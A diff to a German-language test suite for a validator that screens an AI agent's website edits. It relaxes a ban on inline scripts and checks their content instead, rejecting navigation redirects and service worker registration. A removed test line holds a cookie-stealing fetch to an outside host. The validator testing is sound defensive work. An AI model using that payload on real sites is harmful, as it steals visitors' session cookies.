@@ -246,8 +246,30 @@ describe("validate.ts — Obergrenzen", () => {
 // ===========================================================================
 
 describe("validate.ts — neue Inline-Skripte und Ereignis-Attribute", () => {
-  test("ein neuer <script>…</script>-Block wird abgelehnt", () => {
+  test("ein neuer harmloser <script>-Block ist ERLAUBT — wie eine eigene .js-Datei", () => {
+    /**
+     * Hier stand das Gegenteil, und es kaufte nichts: Eine eigene `.js`-Datei
+     * ist erlaubt, `<script src>` ist erlaubt, und die erzeugte CSP führt
+     * `script-src 'self' 'unsafe-inline'` mit Absicht. Beide Formen laufen mit
+     * denselben Rechten auf derselben Herkunft — das Verbot erzwang eine Datei
+     * mehr, sonst nichts. Geprüft wird jetzt der INHALT, in beiden Formen
+     * gleich.
+     */
     const e = pruefe("leistungen.html", seite("<p>x</p><script>alert(1)</script>"));
+    expect(e.ok).toBe(true);
+  });
+
+  test("ein neuer Block mit skriptgesteuerter Navigation wird abgelehnt", () => {
+    // Das ist die Regel, die für `.js` schon galt und jetzt auch hier greift.
+    const e = pruefe("leistungen.html", seite("<script>location.href=x</script>"));
+    expect(abgelehnt(e)).toBe(true);
+  });
+
+  test("ein neuer Block, der einen Service Worker anfasst, wird abgelehnt", () => {
+    // Die einzige Änderung, die die Versionsliste nicht zurücknimmt. Für `.js`
+    // war das gedeckt; inline war es vorher nur durch das pauschale Verbot
+    // gedeckt — und wäre mit dessen Wegfall offen gewesen.
+    const e = pruefe("leistungen.html", seite('<script>navigator.serviceWorker.register("/sw.js")</script>'));
     expect(abgelehnt(e)).toBe(true);
   });
 
@@ -288,20 +310,42 @@ describe("validate.ts — neue Inline-Skripte und Ereignis-Attribute", () => {
     expect(e.ok).toBe(true);
   });
 
-  test("ein GEÄNDERTER Inline-Block wird abgelehnt", () => {
+  test("ein GEÄNDERTER Block wird am Inhalt gemessen, nicht am Unterschied", () => {
     const alt = seite(`<script>a()</script>`);
-    const neu = seite(`<script>a();fetch("https://fremd.de/?c="+document.cookie)</script>`);
-    expect(abgelehnt(pruefe("index.html", neu, alt))).toBe(true);
+    // Harmlos geändert: erlaubt.
+    expect(pruefe("index.html", seite(`<script>a();b()</script>`), alt).ok).toBe(true);
+    // Mit neuem Verstoß: abgelehnt.
+    expect(abgelehnt(pruefe("index.html", seite(`<script>a();location.href=z</script>`), alt))).toBe(true);
   });
 
-  test("ein zusätzlicher Block neben dem unveränderten wird abgelehnt", () => {
+  test("ein zusätzlicher harmloser Block neben dem unveränderten ist erlaubt", () => {
     const alt = seite(`<script>a()</script>`);
     const neu = seite(`<script>a()</script><script>b()</script>`);
-    expect(abgelehnt(pruefe("index.html", neu, alt))).toBe(true);
+    expect(pruefe("index.html", neu, alt).ok).toBe(true);
   });
 
-  test("bei einer NEUEN Datei ist jeder Inline-Block neu", () => {
-    expect(abgelehnt(pruefe("neu.html", seite("<script>a()</script>"), null))).toBe(true);
+  test("bei einer NEUEN Datei sind Inline-Blöcke erlaubt — das war die teure Lücke", () => {
+    /**
+     * DER FALL, DER DAS VERBOT ZU FALL GEBRACHT HAT. Für eine neue Datei ist
+     * jeder Inline-Block zwangsläufig neu, also fiel jeder. Der Agent konnte
+     * den Seitenkopf der Fabrik damit NIE vollständig kopieren — Markup ja,
+     * Skripte nein.
+     *
+     * Gemessen an einer angelegten Produktseite: Menüknopf nicht verdrahtet,
+     * `--kanon-kopfhoehe` beim CSS-Rückfall statt der gemessenen Höhe, auf dem
+     * Handy ein zerdrückter Kopf. Auf JEDER neu angelegten Seite.
+     */
+    expect(pruefe("neu.html", seite("<script>a()</script>"), null).ok).toBe(true);
+    // Der Inhalt wird trotzdem geprüft — „neue Datei" ist kein Freibrief.
+    expect(abgelehnt(pruefe("neu.html", seite("<script>location.href=x</script>"), null))).toBe(true);
+  });
+
+  test("ein Verstoß, der VORHER schon dastand, sperrt die Seite nicht", () => {
+    // Sonst wäre eine Fabrik-Seite, die eine solche Zeile enthält, für den
+    // Agenten dauerhaft unbearbeitbar — dieselbe Bestandsregel wie bei `.js`.
+    const alt = seite(`<script>location.href=x</script>`);
+    const neu = seite(`<p>Neuer Absatz.</p><script>location.href=x</script>`);
+    expect(pruefe("index.html", neu, alt).ok).toBe(true);
   });
 
   test('<script src="/assets/app.js"> ist erlaubt — eigener Ursprung, eigene Datei', () => {
@@ -788,7 +832,7 @@ describe("validate.ts — die Ablehnung geht als Text an den Agenten zurück", (
       ["daten.json", "{}"],
       ["Foo Bar.html", "<p>x</p>"],
       ["gross.txt", "a".repeat(MAX_DATEI_BYTES + 1)],
-      ["index.html", seite("<script>a()</script>")],
+      ["index.html", seite("<script>location.href=x</script>")],
       ["index.html", seite('<img src="//fremd.de/x.png" alt="">')],
     ] as const) {
       const e = pruefe(pfad, inhalt);
@@ -801,7 +845,10 @@ describe("validate.ts — die Ablehnung geht als Text an den Agenten zurück", (
   });
 
   test("der Grund enthält nicht den ganzen Dateiinhalt", () => {
-    const inhalt = seite(`<script>${"x".repeat(2000)}</script>`);
+    // Der Verstoß steht am Anfang, der Rest ist Füllung: Der Grund darf die
+    // Datei nicht zurückspiegeln — sonst bläht jede Ablehnung den Kontext des
+    // Agenten auf und kostet Kontingent.
+    const inhalt = seite(`<script>location.href=x;${"x".repeat(2000)}</script>`);
     const e = pruefe("index.html", inhalt);
     expect(e.ok).toBe(false);
     if (!e.ok) expect(e.grund).not.toContain("x".repeat(200));
